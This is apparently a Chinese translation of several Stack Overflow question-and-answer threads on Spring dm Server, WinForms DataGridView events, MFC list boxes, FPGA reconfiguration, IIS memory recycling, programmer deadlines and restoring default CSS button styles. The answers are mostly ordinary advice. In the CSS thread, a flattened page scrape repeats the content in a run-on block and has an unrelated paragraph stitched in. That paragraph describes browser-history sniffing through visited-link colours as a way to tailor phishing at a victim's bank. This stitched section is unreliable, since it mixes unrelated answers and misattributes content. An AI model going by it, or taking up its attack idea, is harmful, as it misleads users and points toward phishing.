> 赞同：4
> 
> 时间：2008-12-23T02:11:15.203

Java EE 应用服务器具有分布式事务管理器。如果这很重要，那么可能想看看 SpringSource dm 是否包含这些。

可以使用 Spring-Framework 进行 XA TX，只是您需要自己找到合适的 XA 管理器并将其集成。

当然 XA TX 已经声名狼藉。大多数人试图像瘟疫一样避免它们。例如，Amazon.com 不使用它们。

我们目前组合使用 Spring-Framework 和 Tomcat。我们进行所有自己的集成。很多人都做出了类似的中间层堆栈选择。我们确实与 Spring-Framework API 相关联——就像 Java EE 人员与 Java EE/EJB 相关联一样。不要让春天的花言巧语欺骗你。但是，它继续保持开放源代码可供用户社区访问。

一旦你使用 Java EE，你就会被绑定到一个特定的 Java EE 供应商，因为很难在实现之间移动。EJB3 据说会缓解这一点，但我敢打赌，切换 Java EE 应用程序服务器仍将是一项重大任务。

坦率地说，Spring-Framework 提供了比 Java EE/EJB 标准更有用的 API，而且它的创新速度更快。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2010-06-24T10:39:54.610

这是一个旧线程，但我认为对于遇到此问题的人（就像我所做的那样）分享最近的 GlassFish OSGi 增强功能，主要是在 OSGi 企业 RFC 领域：[http ://wiki.glassfish.java.net /Wiki.jsp?page=OsgiDashboard](http://wiki.glassfish.java.net/Wiki.jsp?page=OsgiDashboard)

当然，还有基于@Resource 的 OSGi 声明式服务注入，自 09 年 12 月的 v3 以来就一直存在。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-23T15:44:26.137

我认为 SpringSource 对 Covalent Technologies 的[收购](http://www.springsource.com/pressreleases/2008/covalentaquisition)使他们能够更好地帮助任何使用 Spring/Tomcat 堆栈的人。Spring dm Server 附带的 Tomcat 优化可能比 OSGi 特性更有价值。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-13T11:17:49.890

在 Glassfish 中使用 OSGi 具有误导性。Glassfish 在服务器内部使用 OSGi；OSGi 不适用于 Glassfish 中部署的应用程序。

使用 Spring dm 服务器，可以编写应用程序以使用 OSGi。

OSGi 对您来说是一个重要的考虑因素吗？唯一其他真正的 OSGi 应用服务器是 Paremus 的 Infiniflow。所有其他应用服务器现在都在谈论 OSGi，但它是一个内部实现细节；它不适用于已部署的应用程序。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-22T07:42:04.723

我没有使用过 SpringSource dm 服务器，但我相信在生产环境中尝试之前最好等待一段时间。原因与它是相当新的技术有关。此外，许可方案与 SpingSource (GPL) 一起使用的方式并没有太大帮助，因为它实际上意味着您现在和将来将只依赖 SpringSource。如果您需要对服务器的支持，那么您唯一的选择就是使用 SpringSource。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-19T21:05:57.833

SpringSource dm Server 支持模块化应用程序——您可以将应用程序划分为 OSGi 包，并在应用程序之间共享您关心的任何基础设施服务。这使您远离 Java EE 定义的 WAR 等单体结构。通常，这意味着您在开发过程中获得了非常快速的编辑/保存/重新部署周期。OSGi 然后允许您对模块和它们导出的包进行版本控制以及动态更新模块，而无需重新启动整个服务器。

SpringSource dm Server 是作为 OSGi 捆绑包从头开始构建的。因此，如果您不想要标准集，您可以配置加载 dm Server 的哪些子系统。

# c# - DataGridView.CellContentClick

> ID：381072
> 
> 赞同：4
> 
> 时间：2008-12-19T14:17:39.810
> 
> 标签：c#, winforms

如果我鼠标单击 DataGridViewCheckBoxCell 非常快，DataGridView.CellContentClick 不会触发。我该如何解决这个问题？我需要知道 CheckBox 的检查状态何时改变

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-22T15:22:00.380

尝试处理`CellMouseUp`事件。
您可以检查`MouseUp`事件发生在哪个列，看看它是否是您的复选框列。
您还可以确定它是否处于编辑模式并以编程方式结束编辑模式，这反过来会触发`CellValueChanged`事件。

在下面的示例中，我有一个带有两个列的 DataGridView。
第一个是a `DataGridViewTextBoxColumn`，第二个是a `DataGridViewCheckBoxColumn`。
当复选框更改时，第一列将反映其选中状态，而无需从行或单元格中移动。

```
public partial class Form1 : Form
{
    public Form1()
    {
        InitializeComponent();
        dataGridView1.Rows.Add("False", false);
        dataGridView1.Rows.Add("True", true);
    }

    private void dataGridView1_CellMouseUp(object sender, DataGridViewCellMouseEventArgs e)
    {
        if (e.ColumnIndex == 1 && e.RowIndex >-1 && dataGridView1.Rows[e.RowIndex].Cells[1].IsInEditMode)
        {
            dataGridView1.EndEdit();
        }
    }

    private void dataGridView1_CellValueChanged(object sender, DataGridViewCellEventArgs e)
    {
        if (e.RowIndex != -1)
        {
            dataGridView1.Rows[e.RowIndex].Cells[0].Value =
               dataGridView1.Rows[e.RowIndex].Cells[e.ColumnIndex].Value.ToString(); 
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-19T14:41:53.753

无论用户在复选框单元格中单击的速度有多快，该值都不会从 true 更改为 false，反之亦然，直到他们单击该行之外，并且 DataGridView 退出编辑模式。

我过去所做的就是将该列设置为 ReadOnly = true。然后，在 CellContentClick 事件处理程序中，如果单击了该列，我手动翻转布尔值，如下所示：

```
bool b = (bool)this.dataGridView1.Rows[e.RowIndex].Cells[e.ColumnIndex].Value;
this.dataGridView1.Rows[e.RowIndex].Cells[e.ColumnIndex].Value = !b; 
```

然后，您可以在此时执行您通常为 CheckChanged 执行的逻辑。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-21T03:35:06.533

我参加聚会有点晚了，但是 msdn 在[这里](http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridview.cellcontentclick.aspx)对这个问题有一个很好的答案。

```
'Ends Edit Mode So CellValueChanged Event Can Fire
Private Sub EndEditMode(sender As System.Object, e As EventArgs) _
    Handles DataGridView1.CurrentCellDirtyStateChanged
    'if current cell of grid is dirty, commits edit
    If DataGridView1.IsCurrentCellDirty Then
        DataGridView1.CommitEdit(DataGridViewDataErrorContexts.Commit)
    End If
End Sub 
```

我还写了一篇关于 msdn 修复的非常详细的阐述，以及在[立即触发 DataGridView CellValueChanged 事件的帖子中找到的那些](http://codingeverything.blogspot.com/2013/01/firing-datagridview-cellvaluechanged.html)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-03-11T11:40:14.043

最好处理事件`CellContentClick`（如果您在框外不小心单击，它将无法正常工作）：

```
grid.CellContentClick += delegate(object obj, DataGridViewCellEventArgs args)
{
    var cell = (settings_grid[args.ColumnIndex,args.RowIndex] as DataGridViewCheckBoxCell);

    if (cell != null)
    {
        bool new_value = !(bool)cell.Value;                                        
        RecordTheNewState(new_value); // you record the new checkbox state
    }
}; 
```

# c++ - 删除后的 CVSListBox 通知

> ID：381077
> 
> 赞同：3
> 
> 时间：2008-12-19T14:20:00.663
> 
> 标签：c++, mfc, mfc-feature-pack

我刚刚向项目中添加了一个新的（MFC 功能包）CVSListBox 控件。控件中的项目列表由我的应用程序中的其他一些对象跟踪，因此当有任何更改时，我需要从列表框中获取大量通知，以便我可以更新其他内容。对于那些不知道该控件的人，有一个按钮栏提供基本的添加/删除/重新排序功能。

CVSListBox 控件为诸如添加或重命名项目以及更改它们的顺序之类的事情提供了可覆盖的虚函数——所有这些都很好地工作。

但是，对于删除项目，唯一的替代是 OnBeforeRemoveItem，它在项目被删除之前调用，并且必须返回 TRUE/FALSE 以允许删除。一旦删除发生，就没有具体的通知。

删除后获得通知的最佳方式是什么？

显然，这里有可能破解一些可怕的东西，因为在删除之后会有一个选择更改事件，并且可以从删除前保留一个标志来表示下一个选择更改是特殊的。但我觉得我错过了一些更清晰、更明显的东西。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T19:00:44.963

假设每次都会真正删除该项目，您可以：

*   在 OnBeforeRemoveItem 覆盖中进行处理，就好像该项目已被删除一样
*   引发您自己的 OnAfterItemRemoved 事件
*   看看您是否可以获得底层列表控件的句柄（无论它可能是什么）并挂钩其中一个事件

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-19T17:43:43.447

Try something like this:

```
class my_lbox : public CVSListBox
{
    protected:

        BOOL OnBeforeRemoveItem(int what_item)
        {
            CString txt = GetItemText(what_item);
            DWORD_PTR idata = GetItemData(what_item);

            if(true) //up to you to check if this item can be removed
            {
                OnAfterRemoveItem(txt,idata);
                return TRUE;
            }
            return FALSE;
        }

        void OnAfterRemoveItem(const CString& txt, DWORD_PTR idata)
        {
            CString info;
            info.Format(L"Removing item:'%s'",txt);

            MessageBox(info);
        }
}; 
```

Hope it helps.

# verilog - 可以在 VHDL 中完成动态可插拔模块吗？

> ID：381082
> 
> 赞同：1
> 
> 时间：2008-12-19T14:22:59.127
> 
> 标签：verilog, vhdl, fpga, dynamic-loading, hdl

在c（嵌入式）中，可以通过定义函数指针表和模块可以加载到的地址范围来实现插件。

这需要链接器指令来分配空间并定义函数表的位置。

HDL / VHDL或Verilog中是否有类似的机制。

我想我在想的是在 FPGA 中定义一个门块以用于我的扩展功能，定义它将连接到的端口，然后能够将逻辑加载到该块中以执行特定操作。

这必须在运行时进行，因为 FPGA 是交付插件的通信系统的一部分。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-19T18:39:14.073

如果您使用的是 Xilinx FPGA，他们的一些芯片可以支持这一点。

请参阅： [使用 Xilinx 进行部分重配置的好处](http://www.xilinx.com/publications/xcellonline/xcell_55/xc_reconfig55.htm)

--杰夫克++

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-30T17:14:50.880

您正在寻找的功能与 VHDL 的领域是正交的。VHDL 允许模块（实体，由架构实现），所以理论上，是的，这可以工作。但在实践中，这实际上取决于您正在运行的系统。

你期望从中获得什么？节省重新配置时间？

如果您有一个足够复杂的电路板并运行了一些软件，您可以轻松地从某个通信渠道下载 FPGA 的全新配置。通过使用部分重配置，您还可以在 Xilinx 上获得小的性能优势。

或者，也许您可​​以创建一个可配置的 VHDL 模块，软件将在运行时配置该模块以根据需要运行。

# .net - 工作进程回收，因为它达到了它的虚拟内存限制

> ID：381088
> 
> 赞同：10
> 
> 时间：2008-12-19T14:26:48.480
> 
> 标签：.net, iis-6, application-pool

我们为我们的客户托管了一个相当大的（自行编写的）ASP.NET 网站。它由一个 Web 服务、一个网站和一个图像服务网站组成，这三个网站都在它们自己的虚拟目录中。三个虚拟目录一起在一个应用程序池中。该池的内存限制（最大虚拟内存和最大使用内存）都设置为 500 兆字节。

但是，应用程序池会遭受多次回收，即使一次只有一个用户。事件日志消息说：

> 服务应用程序池“xxxx”的进程 ID 为“xxxx”的工作进程已请求回收，因为它已达到其虚拟内存限制。

但是，使用 Process Explorer 观察工作进程没有显示任何支持此消息的信息。我应该观察哪些计数器来观察实际上受这两种设置限制的内存？

**更新 1**

在任务管理器中观察进程会显示大约 100 MB 的“内存使用情况”和“虚拟机大小”，但进程仍会使用上述消息进行回收。服务器上可用的 5 GB 物理内存...

**更新 2**

尽管网站相当大，但问题集中在应用程序的一小部分。它执行查询（使用 Oracle）并将结果绑定到 gridview 和转发器 web 控件。结果包括一个简短的描述和一个图标（通过图像服务网站加载）。如果我一个接一个地执行 10 个搜索操作，每个操作给出 9 个结果，则工作过程显示 mem 使用情况和 vm 大小约为 100 MB 并回收......

**更新 3** 切换图像服务网站的使用不会产生更好的结果。所以我认为可以公平地说问题出在其他问题上。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T14:39:56.113

就像观察一样...如果您的“图像服务”站点碰巧进行任何内联图像处理/生成，您可以通过不调用`Dispose()`任何一次性资源来快速吞噬内存 - 特别是那些包装本机功能的资源...

这不是您问题的直接答案，但它可能有助于调查导致内存使用猖獗的潜在问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-08-16T12:35:41.700

当我们将内存大小从 4Gb 升级到 8Gb（具有讽刺意味）时，我在使用虚拟机时遇到了同样的问题。我发现这个博客解释了我们可以在 64 位系统上使用“私有内存限制”但不能使用“虚拟内存限制”，因为：“如果你在 64 位平台上（我是），ASP.NET 应用程序会积极保留虚拟内存” .

[http://blog.walteralmeida.com/2011/07/iis7-private-memory-limit-versus-virtual-memory-limit.html](http://blog.walteralmeida.com/2011/07/iis7-private-memory-limit-versus-virtual-memory-limit.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T14:40:19.047

这可能是有用的链接：

[http://blogs.msdn.com/tom/archive/2008/06/25/asp-net-tips-finding-what-is-taking-up-memory.aspx](http://blogs.msdn.com/tom/archive/2008/06/25/asp-net-tips-finding-what-is-taking-up-memory.aspx)

（以及较早的帖子，这些帖子解释了他正在做的事情的更多背景）

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-19T14:36:56.637

尝试使用 Windows 任务管理器。在进程选项卡上，转到查看菜单并选择选择列。选择 Virtual Memory Size 列，然后观察 asp.net 工作进程的值。

# project-management - 您如何处理程序员的日程安排/截止日期？

> ID：381089
> 
> 赞同：15
> 
> 时间：2008-12-19T14:26:53.847
> 
> 标签：project-management, scheduling, deadlines

程序员喜欢创建最后期限吗？我是一名网络开发人员，在我的领域里到处都是时间表/截止日期。但是我曾与一些讨厌截止日期的软件工程师/程序员一起工作，有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2008-12-19T14:36:22.720

首先，您需要区分最后期限和估计。

*   截止日期来自外部来源，例如，“功能 X 需要为贸易展做好准备”。
*   估计来自内部来源，例如，“功能 X 将需要 N 周才能完成”。

通常，程序员应该创建估算，而销售/营销将创建最后期限。

当这两个问题无法解决时就会出现问题——如果最后期限比估计的更近。

对开发人员（潜在客户）的有用提示：

*   让做这项工作的人创建估算。
*   确保估算基于微小的任务，每个任务不超过一两天。
*   使用反馈循环让开发人员提高他们的估计技能。
*   准确的估算技能可以让您更加努力地应对最后期限的要求。

对营销人员/截止日期创建者的有用提示：

*   不要用截止日期覆盖估算值。
*   如果最后期限与估计值冲突，唯一的实际选择是 (a) 开发人员加班，(b) 对最后期限的要求被削减，或者 (c) 错过最后期限。
*   解释为什么截止日期很重要，以及功能截止日期的目的是什么（“客户 X 将签署六位数的合同”）。
*   要明白，那些觉得自己无法按时完成任务的人不会有动力。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-19T14:37:25.277

程序员讨厌最后期限是有充分理由的！

在您完成之前，几乎不可能准确估计一段代码需要多长时间来设计、编写和调试。

根据我的个人经验，我花了一个多星期的时间来编写一个“简单”的 shell 脚本，我估计大约需要一个小时。另一方面，我花了大约一周的时间为 COBOL 数据定义（包括所有奇怪的 COMP COMP-3 OCCURS 重新定义 SYNC 和 slack 字节的东西）编写解析器，我估计大约需要两个月。

另一个大问题是，面对紧迫的最后期限，程序员会跳过最佳实践并开始进行黑客攻击。从而节省了大约 50% 的编码时间，但增加了 300% 的测试和调试时间。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-12-19T14:35:39.633

传统上，您只能调整质量、功能或时间，最后一个是截止日期。你真的不想乱来的质量。因此，只要您使用的流程允许您校准功能以达到最后期限，我就可以了。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-12-19T14:38:01.093

开发人员需要参与创建最后期限。如果它们是任意的并且在没有开发人员输入的情况下创建，那么他们有权投诉。项目合法地从业务中获得时间限制，但必须调整资源和功能以进行补偿。如果没有开发人员（更不用说 BA、QA 和运营人员）的投入，这些调整就无法进行。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-12-19T14:38:18.833

我遇到的唯一讨厌截止日期的软件工程师/开发人员有这样的感觉，原因有两个：

1.  他们完全杂乱无章，并且知道他们不会赶上最后期限，因此不喜欢他们，因为当他们错过最后期限时，这会让他们看起来很糟糕。
2.  他们对截止日期没有问题，只要了解所涉及工作的人设定截止日期即可。最糟糕的最后期限是经理们试图推销一个项目并说“3周？没问题！” 然后告诉他们的开发团队，他们有 3 周的时间来制作 MS Office 的工作版本，并为 CEO 的小孩重新创建互联网。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-12-19T14:34:37.793

我认为这取决于如何创建时间表。开发人员需要在制定时间表方面发挥重要作用。否则你怎么知道它是否合理？

如果高层管理人员只是简单地规定“功能 X 需要由 Y 完成”，而没有很好地了解它可能需要多长时间（有些事情的实施比听起来要复杂得多），那就不好了事物。但是，如果他们与开发人员一起估计实际需要的工作量并将其与公司的其他需求相平衡，那么它通常会很好地工作。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-12-19T14:33:02.633

**好吧，如果**截止日期是通过深思熟虑的估算过程确定的，并且经理和工程师都提供了意见，**并且**对在截止日期前应交付的内容的要求得到了明确的定义，那么我对截止日期感到非常满意。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-12-19T14:37:02.360

定期审查至关重要：

*   列出主要里程碑和可交付成果
*   把它分成更小的块
*   创建较小估计值的集合
*   使最后期限合理

你必须有最后期限，但同样，这些最后期限必须是现实的和可衡量的。移动规范会惹恼开发人员——这可能是不可避免的，但不要害怕移动（经过讨论）。

截止日期和工作估算永远不会特别准确，但是基本的项目管理技术应该意味着人们意识到错过了它们 - 以及它发生的原因。

# html - 有没有人解决这个问题 !=

> ID：381096
> 
> 赞同：2
> 
> 时间：2008-12-19T14:32:01.327
> 
> 标签：html, treeview, rendering

我正在使用[`asp:TreeView`](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.treeview.aspx)and 真的宁愿使用 and 将其输出到标准嵌套`<HTML>`列表，目前它使用s 和`<ul>`s生成一些非常丑陋的代码。`<li>``<div>``<table>`

有没有人有一个体面的解决方法？

我`<asp:XmlDataSource>`用来填充`TreeView`

这很好地[解释了当前的情况。](http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=102232)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-19T14:36:18.167

看过[CSS-Adapters](http://www.asp.net/CSSAdapters/TreeView.aspx)吗？他们应该做你正在寻找的东西。

# css - 恢复 CSS 样式 我正在使用一个将脚本标签插入当前网页的书签。 这个脚本有一些用户界面和一个“ input type=submit....”标签。 网页 A 选择不设置 " input type=submit.." 标记的样式，而网页 B 已设置 问问题 molicule 问问题 2008-12-19T14:33:13.007 37352 次 This question shows research effort; it is useful and clear 18 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. 我正在使用一个将脚本标签插入当前网页的书签。 这个脚本有一些用户界面和一个“ input type=submit....”标签。 网页 A 选择不设置 " input type=submit.." 标记的样式，而网页 B 已设置它们的样式。 这会导致小书签根据底层页面的样式显示不同样式的提交按钮。 我希望所有网页上的提交按钮都以默认方式设置相同的样式。 一种解决方案是在我的脚本中为提交按钮设置 CSS 样式，以便它在所有页面上显示相同。（这是我为所有其他标签所做的）。 我的问题是： 如何设置提交按钮的 CSS 样式，使其以“默认方式”或“默认方式”显示？ 可以删除现有样式吗？如果可以，按钮如何以“默认方式”显示？ 换句话说，无论底层网页是否选择了样式，我如何才能让我的书签 UI 中的提交按钮以“默认方式”显示？ 注意：“默认方式”是指未添加样式时提交按钮的显示方式。例如， http://www.google.com上的“Google 搜索”或“我感觉很幸运”按钮。 好吧，任何恶意 JavaScript 最终都会通过浏览器功能发挥作用，因此这个概念验证演示可能符合您的要求。它利用页面可以动态创建指向给定 URL 的链接这一事实，然后检查它是什么颜色，以确定您的浏览器是否认为该站点是您浏览历史的一部分。该链接所做的只是尝试猜测您的性别，但同样的想法也可用于攻击 - 例如，它可以测试主要银行的 URL，并为您提供针对您使用的任何银行定制的网络钓鱼攻击。 当然，这可能（应该）在未来的浏览器版本中得到修复，但大多数漏洞利用都是如此。 cssbookmarklet 4 10 回答 10 This answer is useful 8 取自Mozilla 开发者中心 恢复默认属性值 因为 CSS 不提供“default”关键字，所以恢复属性默认值的唯一方法是显式地重新声明该属性。因此，在使用选择器（例如，按标签名称的选择器，例如 p）编写样式规则时应特别小心，您可能希望用更具体的规则（例如使用 id 或类选择器的规则）覆盖这些规则，因为原始默认值无法自动恢复。由于 CSS 的级联特性，最好尽可能具体地定义样式规则，以防止样式化元素不打算设置样式。 您唯一的方法是在其css规则中非常明确的按钮上设置您自己的类：即 background-color:grey !important; 代替 background:grey; 于 2008-12-19T14:44:20.100 回答 This answer is useful 7 对于 Firefox，您可以通过在地址栏中键入 resource://gre/res/forms.css 来找到默认表单样式，这至少可以为您提供输入按钮的默认样式的详细信息，以便您可以复制它们并使用 !important 规则覆盖。 这并不完全令人满意，因为默认样式当然会随着浏览器的未来版本而改变，并且不同浏览器的默认样式可能会有所不同。 于 2009-06-08T14:08:10.643 回答 This answer is useful 5 您可以限制 INPUT 的 CSS 样式（提交按钮是一种输入类型），因此它不会影响提交按钮 因此，不仅仅是放： input{ blah; blah; blah; } 您可以创建样式： input[type="text"] { blah blah blah } 这只会影响文本输入，将包括提交按钮在内的所有其他内容保留为默认值。 JWW 对 resource://gre/res/forms.css 的引用很有帮助。如果您看一下，您将看到如何设置样式以影响几种不同类型的输入。 于 2009-07-16T21:46:37.170 回答 This answer is useful 1 谢谢，使用效果很好 INPUT, SELECT { color: #003333; font-size: 90%; border-bottom: #d3d3d3 1px solid; border-left: #d3d3d3 1px solid; border-top: #d3d3d3 1px solid; border-right: #d3d3d3 1px solid; } INPUT[type="submit"] { background-color: #336699; color: #f0e68c; } 于 2010-04-04T18:04:13.290 回答 This answer is useful 1 Firefox 中默认样式的 url 至少在 ff14 中不再有效，新位置是： resource:///chrome/toolkit/res/forms.css 于 2012-07-25T11:07:47.197 回答 This answer is useful 1 您可以使用以下样式将按钮样式重置为默认样式 .reset-this { animation : none; animation-delay : 0; animation-direction : normal; animation-duration : 0; animation-fill-mode : none; animation-iteration-count : 1; animation-name : none; animation-play-state : running; animation-timing-function : ease; backface-visibility : visible; background : 0; background-attachment : scroll; background-clip : border-box; background-color : transparent; background-image : none; background-origin : padding-box; background-position : 0 0; background-position-x : 0; background-position-y : 0; background-repeat : repeat; background-size : auto auto; border : 0; border-style : none; border-width : medium; border-color : inherit; border-bottom : 0; border-bottom-color : inherit; border-bottom-left-radius : 0; border-bottom-right-radius : 0; border-bottom-style : none; border-bottom-width : medium; border-collapse : separate; border-image : none; border-left : 0; border-left-color : inherit; border-left-style : none; border-left-width : medium; border-radius : 0; border-right : 0; border-right-color : inherit; border-right-style : none; border-right-width : medium; border-spacing : 0; border-top : 0; border-top-color : inherit; border-top-left-radius : 0; border-top-right-radius : 0; border-top-style : none; border-top-width : medium; bottom : auto; box-shadow : none; box-sizing : content-box; caption-side : top; clear : none; clip : auto; color : inherit; columns : auto; column-count : auto; column-fill : balance; column-gap : normal; column-rule : medium none currentColor; column-rule-color : currentColor; column-rule-style : none; column-rule-width : none; column-span : 1; column-width : auto; content : normal; counter-increment : none; counter-reset : none; cursor : auto; direction : ltr; display : inline; empty-cells : show; float : none; font : normal; font-family : inherit; font-size : medium; font-style : normal; font-variant : normal; font-weight : normal; height : auto; hyphens : none; left : auto; letter-spacing : normal; line-height : normal; list-style : none; list-style-image : none; list-style-position : outside; list-style-type : disc; margin : 0; margin-bottom : 0; margin-left : 0; margin-right : 0; margin-top : 0; max-height : none; max-width : none; min-height : 0; min-width : 0; opacity : 1; orphans : 0; outline : 0; outline-color : invert; outline-style : none; outline-width : medium; overflow : visible; overflow-x : visible; overflow-y : visible; padding : 0; padding-bottom : 0; padding-left : 0; padding-right : 0; padding-top : 0; page-break-after : auto; page-break-before : auto; page-break-inside : auto; perspective : none; perspective-origin : 50% 50%; position : static; /* May need to alter quotes for different locales (e.g fr) */ quotes : '\201C' '\201D' '\2018' '\2019'; right : auto; tab-size : 8; table-layout : auto; text-align : inherit; text-align-last : auto; text-decoration : none; text-decoration-color : inherit; text-decoration-line : none; text-decoration-style : solid; text-indent : 0; text-shadow : none; text-transform : none; top : auto; transform : none; transform-style : flat; transition : none; transition-delay : 0s; transition-duration : 0s; transition-property : none; transition-timing-function : ease; unicode-bidi : normal; vertical-align : baseline; visibility : visible; white-space : normal; widows : 0; width : auto; word-spacing : normal; z-index : auto; } 参考链接 - GitHub 以上是您问题的解决方案，但我不认为 css reset 是可行的，除非我们最终遇到这种情况，所以尽量避免这种情况。 我希望这能帮到您。 谢谢 于 2016-05-24T13:50:59.840 回答 This answer is useful 0 我所做的，它似乎适用于所有浏览器是...... $(buttonID).css({ 'background-color':'' }); 只需将背景颜色留空，它似乎就可以将按钮恢复为默认状态。 于 2012-11-06T10:07:55.393 回答 This answer is useful 0 这似乎工作得很好（相信我，试试吧）： /* Restore Browser's Default Submit Button Style */ input[type=submit] { background:ButtonFace; color:ButtonText; border:2px outset ButtonFace; } input[type=submit]:active { border-style:inset; -webkit-appearance:push-button; } 于 2013-11-13T01:09:14.853 回答 This answer is useful 0 我想出了同样的问题。这篇文章对我帮助很大。我必须将该 CSS 规则分配给特殊表格中的文本输入，而不是分配给页面中的所有文本输入。所以我不得不使用带有表 id 的 CSS 规则。这应该适用于表单 ID。 '#addForum note' 是特殊格式表的 id。 #addForumNote input[type="text"], label, textarea{ width: 425px; background-color: #ccc; border-style: solid; border: 1px; border-color: #7a7b7a; } 希望这可以帮助某人。谢谢。 于 2010-12-31T03:42:34.090 回答 This answer is useful 0 我认为没有任何方法可以访问计算的样式。Javascript（据我所知）只能设置内联样式和分配类。我希望 DOM 样式对象可以访问计算的样式，但遗憾的是没有。 在这一点上我能想到的最好的事情就是简单地声明你自己的 css 规则来覆盖主机站点使用的任何内容。只要你的css规则更具体，它最终会赢。这将使您的书签在浏览器中具有一致的外观和感觉，这最终可能不是一件坏事。 于 2011-04-15T20:27:05.447 回答 Related 1 performance - 如何在 php 的 yii 框架中定义 cdbcache 中的依赖关系？ 2 javascript - 替代 setTimeout(code,millisec) api 4 ios - 适用于各种日期格式的正则表达式 iOS 2 html - 拉伸 div 上的图像背景或 div 中的完整背景图像 3 ruby-on-rails - rails3 - 这是更好的性能代码 1 android - Android Studio 堆大小 7 java - = 和 new 的区别 2 git - 在 github 上查找强制推送的提交者 1 html - HTML5 - 元描述标签在谷歌中显示时不起作用 1 php - PHP动态网格显示新闻不会重置id Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：381100
> 
> 赞同：18
> 
> 时间：
> 
> 标签：css, bookmarklet

我正在使用一个将脚本标签插入当前网页的书签。

这个脚本有一些用户界面和一个“ `input type=submit....`”标签。

网页 A 选择不设置 " `input type=submit..`" 标记的样式，而网页 B 已设置它们的样式。

这会导致小书签根据底层页面的样式显示不同样式的提交按钮。

我希望所有网页上的提交按钮都以**默认方式设置**相同的样式。

一种解决方案是在我的脚本中为提交按钮设置 CSS 样式，以便它在所有页面上显示相同。（这是我为所有其他标签所做的）。

我的问题是：

1.  如何设置提交按钮的 CSS 样式，使其以“默认方式”或“默认方式”显示？
2.  可以删除现有样式吗？如果可以，按钮如何以“默认方式”显示？

换句话说，无论底层网页是否选择了样式，我如何才能让我的书签 UI 中的提交按钮以“默认方式”显示？

> 注意：“默认方式”是指未添加样式时提交按钮的显示方式。[例如， http://www.google.com](http://www.google.com)上的“Google 搜索”或“我感觉很幸运”按钮。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-19T14:44:20.100

取自[Mozilla 开发者中心](https://developer.mozilla.org/en/Common_CSS_Questions)

> **恢复默认属性值** 因为 CSS 不提供“default”关键字，所以恢复属性默认值的唯一方法是显式地重新声明该属性。因此，在使用选择器（例如，按标签名称的选择器，例如 p）编写样式规则时应特别小心，您可能希望用更具体的规则（例如使用 id 或类选择器的规则）覆盖这些规则，因为原始默认值无法自动恢复。由于 CSS 的级联特性，最好尽可能具体地定义样式规则，以防止样式化元素不打算设置样式。

您唯一的方法是在其css规则中非常明确的按钮上设置您自己的类：即

```
background-color:grey !important; 
```

代替

```
background:grey; 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-06-08T14:08:10.643

对于 Firefox，您可以通过在地址栏中键入 resource://gre/res/forms.css 来找到默认表单样式，这至少可以为您提供输入按钮的默认样式的详细信息，以便您可以复制它们并使用 !important 规则覆盖。

这并不完全令人满意，因为默认样式当然会随着浏览器的未来版本而改变，并且不同浏览器的默认样式可能会有所不同。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-07-16T21:46:37.170

您可以限制 INPUT 的 CSS 样式（提交按钮是一种输入类型），因此它不会影响提交按钮

因此，不仅仅是放：

```
input{
blah; blah; blah;
} 
```

您可以创建样式：

```
input[type="text"] {
blah blah blah
} 
```

这只会影响文本输入，将包括提交按钮在内的所有其他内容保留为默认值。

JWW 对 resource://gre/res/forms.css 的引用很有帮助。如果您看一下，您将看到如何设置样式以影响几种不同类型的输入。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-04-04T18:04:13.290

谢谢，使用效果很好

```
INPUT, SELECT
{
    color: #003333;
    font-size: 90%;
    border-bottom: #d3d3d3 1px solid;
    border-left: #d3d3d3 1px solid;
    border-top: #d3d3d3 1px solid;
    border-right: #d3d3d3 1px solid;
}

INPUT[type="submit"]
{
    background-color: #336699;
    color: #f0e68c;
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-25T11:07:47.197

Firefox 中默认样式的 url 至少在 ff14 中不再有效，新位置是：

```
resource:///chrome/toolkit/res/forms.css 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-05-24T13:50:59.840

您可以使用以下样式将按钮样式重置为默认样式

```
.reset-this {
    animation : none;
    animation-delay : 0;
    animation-direction : normal;
    animation-duration : 0;
    animation-fill-mode : none;
    animation-iteration-count : 1;
    animation-name : none;
    animation-play-state : running;
    animation-timing-function : ease;
    backface-visibility : visible;
